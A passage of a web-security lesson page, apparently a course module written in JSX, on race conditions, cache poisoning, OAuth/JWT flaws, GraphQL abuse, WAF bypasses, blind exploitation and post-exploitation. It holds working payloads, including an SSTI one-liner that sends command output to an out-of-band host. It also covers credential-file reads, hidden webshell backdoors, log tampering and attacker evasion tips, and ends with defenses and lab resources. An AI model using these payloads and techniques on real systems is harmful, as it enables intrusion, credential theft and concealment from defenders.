            </Section>

            <Section title="Race conditions — single-packet attack (Kettle 2023)">
              <Analogy>
                Two identical requests arrive before the first finishes its check → the same operation runs twice.
                Classically this needs precise timing. Kettle showed you can ship <b>20-30 requests in a single TCP
                packet</b> → they all land in the same millisecond.
              </Analogy>
              <Code lang="bash">{`# Burp Suite "Send group in single packet"
# Or turbo-intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=30, pipeline=False)
    for i in range(30):
        engine.queue(target.req)
engine.openGate()  # release them all at once`}</Code>
              <Callout kind="warn" title="Real-world impact">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Single-use coupon</b> applied 30× → 100% off cart.</li>
                  <li><b>Balance transfer</b> — double-spending.</li>
                  <li><b>OTP</b> — 6 digits × N attempts on parallel sessions same ms → bypass rate-limit.</li>
                  <li><b>Workspace invite</b> — 30 invites with one paid token.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Cache Poisoning — weaponizing the CDN">
              <Code lang="http">{`# CDN keys cache by URL + a few headers only
# If the app reflects X-Forwarded-Host:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response: <link href="//attacker.com/style.css">
# CDN caches that response for every subsequent visitor on /
# = stored XSS via cache on the homepage`}</Code>
              <p className="opacity-90 mt-2">
                Stronger trick: <b>cache deception</b>. <code>/profile/x.css</code> — app serves the profile
                (ignores .css), CDN caches it as static. Any visitor after you sees your profile page.
              </p>
            </Section>

            <Section title="OAuth / OIDC — breaking sign-in">
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>Open redirect on redirect_uri</b>: if <code>redirect_uri=https://app.com.attacker.com</code> is accepted → the code lands at attacker.</li>
                <li><b>Authorization code injection</b>: victim generates a code, you feed it into another session → account takeover.</li>
                <li><b>Missing state</b> → CSRF on account linking.</li>
                <li><b>JWT alg=none</b> or <b>alg=HS256 with public key as secret</b>: <code>jwt_tool -X i</code>.</li>
                <li><b>kid/jku/x5u injection</b>: point to attacker-controlled JWKS → JWT verified with your key.</li>
                <li><b>Refresh token leakage</b> via referer or localStorage on XSS.</li>
                <li><b>PKCE bypass</b>: server accepts code without code_verifier → code → access.</li>
              </ol>
              <Code lang="bash">{`jwt_tool -t https://target/api -rh "Authorization: Bearer JWT" -M at
# Look for confused-deputy: JWT signed by IdP A accepted by app B`}</Code>
            </Section>

            <Section title="GraphQL — a forgotten attack surface">
              <Code lang="graphql">{`# 1) Introspection often left on in prod
curl -X POST https://target/graphql -H 'Content-Type: application/json' \\
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# 2) Batching attacks → bypass login rate-limit
{"query":"mutation { l1: login(u:\\"a\\",p:\\"1\\"){t} l2: login(u:\\"a\\",p:\\"2\\"){t} ... l1000: login(...) }"}

# 3) Field-level IDOR — resolver doesn't check ownership
{ user(id: 99) { email passwordHash } }

# 4) Nested query DoS
{ user { friends { friends { friends { ...×10 } } } } }`}</Code>
            </Section>

            <Section title="WAF bypass — the parser war">
              <p className="opacity-90">
                The WAF runs regex on what it understands. The app understands something slightly different. The gap is
                the bypass surface.
              </p>
              <TwoCol>
                <Card title="Double encoding" color="red">
                  <Code lang="bash">{`# WAF URL-decodes once. PHP/.NET may decode twice.
?id=1%2527%2520OR%25201=1
# %25 → % → %27 → '`}</Code>
                </Card>
                <Card title="Mixed case + comments" color="red">
                  <Code lang="sql">{`UnIoN/**/SeLeCt/**/1,2,3
# SQL parsers accept all combinations`}</Code>
                </Card>
                <Card title="JSON in URL param" color="red">
                  <Code lang="bash">{`# WAF inspects as URL, app JSON.parses
?filter={"$gt":""}   # MongoDB injection`}</Code>
                </Card>
                <Card title="Body smuggling" color="red">
                  <Code lang="bash">{`# Content-Type: text/plain → WAF skips, app reads as JSON
curl -H 'Content-Type: text/plain' --data '{"role":"admin"}' \\
  https://target/api/profile`}</Code>
                </Card>
                <Card title="Unicode normalization" color="red">
                  <Code lang="bash">{`# Fullwidth K (U+FF2B) becomes K after NFKC
# Useful against ASCII-only regexes`}</Code>
                </Card>
                <Card title="HTTP/2 pseudo-headers" color="red">
                  <p className="opacity-90 text-sm">Older WAFs don't inspect <code>:authority</code> as strictly as <code>Host</code>. Inject divergent values → origin reads what WAF didn't.</p>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Blind exploitation — when you see nothing">
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>OOB (Out-of-Band)</b>: Burp Collaborator, interactsh — DNS+HTTP+SMTP. Each unique subdomain is your signal.</li>
                <li><b>Time-based</b>: <code>SLEEP(5)</code> for SQLi, <code>setTimeout</code> for NoSQL, <code>thread.sleep</code> for Java SSTI.</li>
                <li><b>Boolean-based</b>: watch response length, line count, presence of a marker word.</li>
                <li><b>Side-channel timing</b>: non-constant-time hash comparison → byte-by-byte guessing.</li>
                <li><b>Cache-based</b>: an operation that only triggers a cache miss reveals presence/absence.</li>
              </ol>
              <Code lang="bash">{`# Blind SSTI Jinja2 with OOB
curl 'https://target/render?name={{config.__class__.__init__.__globals__["os"].popen("curl http://OOB/?$(id)").read()}}'`}</Code>
            </Section>

            <Section title="Post-exploitation on web — once you have RCE">
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>Read env vars first</b>: <code>cat /proc/self/environ</code>, <code>env</code>. DB creds, AWS keys, JWT secrets.</li>
                <li><b>Look for .env / config.yaml / appsettings.json</b> in WORKDIR.</li>
                <li><b>K8s?</b> <code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code> — RBAC may hand you the cluster.</li>
                <li><b>Cloud metadata from container</b>: same IMDS works from inside an unrestricted pod.</li>
                <li><b>SSH keys in home</b>, authorized_keys, known_hosts → pivot map.</li>
                <li><b>Database</b>: dump users + password hashes + session tokens. People reuse passwords.</li>
                <li><b>Quiet backdoor</b>: hidden webshell inside an existing endpoint (not a new file). Or a git hook, or cron.</li>
                <li><b>Cover tracks</b>: don't <code>rm -rf /var/log</code> — that's a fire alarm. Edit specific lines.</li>
              </ol>
            </Section>

            <Section title="Attacker OPSEC on the web">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Don't use your home IP.</b> VPN → VPS → target. CDN-fronted callback when possible.</li>
                <li><b>User-Agent matches the target audience.</b> Don't ship <code>python-requests/2.28</code>.</li>
                <li><b>Avoid mass-scan patterns.</b> Nuclei with all templates lights up the WAF instantly. Run template-by-template with <code>--rate-limit 5</code>.</li>
                <li><b>Manual delays</b> on critical actions. Humans don't fire 100 req/s.</li>
                <li><b>Hide payloads where they're not logged.</b> Many apps log only the query string — use body or cookie.</li>
                <li><b>Don't use burpcollaborator.net directly</b> on sensitive ops. Self-host interactsh on a private domain.</li>
                <li><b>Post-exploit cleanup</b>: every uploaded file, created log, added user — track and remove it.</li>
              </ul>
            </Section>

            <Section title="Hands-on labs — learn by doing">
              <ul className="list-disc ps-6 space-y-1 opacity-90">
                <li><b>PortSwigger Web Security Academy</b> — best free interactive reference.</li>
                <li><b>HackTheBox / TryHackMe</b> — web tracks from beginner to expert.</li>
                <li><b>HackerOne / Bugcrowd VDP</b> — unpaid but legal practice.</li>
                <li><b>OWASP Juice Shop / DVWA / WebGoat</b> — local labs.</li>
                <li><b>The Web Application Hacker's Handbook</b> — old but foundational.</li>
                <li><b>James Kettle / Orange Tsai / Sam Curry research</b> — read everything they write.</li>
              </ul>
            </Section>

            <Section title="Defense — the quick reference">
              <Callout kind="good" title="One thing per technique">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Smuggling</b>: HTTP/2 end-to-end, disable downgrade on the CDN, reject ambiguous CL/TE.</li>
                  <li><b>SSRF</b>: explicit host allowlist, block private + link-local + IMDS, IMDSv2 required.</li>
                  <li><b>Deserialization</b>: don't deserialize untrusted. If you must — JSON only with schema validation.</li>
                  <li><b>Prototype pollution</b>: <code>Object.freeze(Object.prototype)</code> + modern libs.</li>
                  <li><b>Race</b>: idempotency keys, DB row locks, single-flight for critical ops.</li>
                  <li><b>Cache</b>: cache key includes all input headers; no responses cached with vague Vary.</li>
                  <li><b>OAuth</b>: PKCE required, state required, redirect_uri exact match.</li>
                  <li><b>GraphQL</b>: introspection off in prod, depth/complexity limits, per-field auth.</li>
                  <li><b>WAF</b>: layered defense — WAF + in-app input validation + output encoding.</li>
                </ul>
              </Callout>
            </Section>
          </>
        }
      />
    </LessonShell>
  );
}
